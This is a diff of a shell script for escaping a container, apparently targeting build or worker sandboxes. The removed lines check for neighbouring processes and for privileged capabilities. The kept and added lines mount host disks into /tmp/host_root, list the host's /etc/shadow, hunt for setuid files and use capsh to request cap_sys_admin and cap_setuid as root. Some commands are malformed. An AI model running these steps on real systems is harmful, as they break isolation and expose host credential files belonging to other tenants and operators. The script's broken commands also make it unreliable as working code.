@@ -1,16 +1,5 @@
 
-echo "--- STARTING ISOLATION RECON ---"
-echo "[*] Checking for neighboring processes..."
-ps aux --forest || ps -ef
-# If you see processes like 'mysql', 'docker-proxy', or names of other apps, 
-# isolation is broken.
 
-
-echo "[*] Checking Linux Capabilities..."
-capsh --print 2>/dev/null || cat /proc/self/status | grep Cap
-# If you see '000001ffffffffff', you are in a privileged container—the ultimate gift for an attacker.
-
-echo "--- RECON COMPLETE ---"
 
 echo "Host Recon"
 # Look for processes with "build", "worker", or "wrangler" in the name
@@ -24,5 +13,8 @@ ls -l /dev/ | grep -E 'sd|nvme|vd'
 mkdir /tmp/host_root
 mount /dev/sda1 /tmp/host_root
 ls /tmp/host_root/etc/shadow
-ls -l /dev/vda* /dev/sda*
-lsblk
+find /dev/vd* -perm -4000 -type f -ls 2>/dev/null
+sudo apt install capsh
+capsh --caps="cap_sys_admin+eip cap_setuid+eip" --user=root--
+sudo mount /dev/vda1 /tmp/host_root
+ls -l /dev/ | grep -E 'sd|nvme|vd'
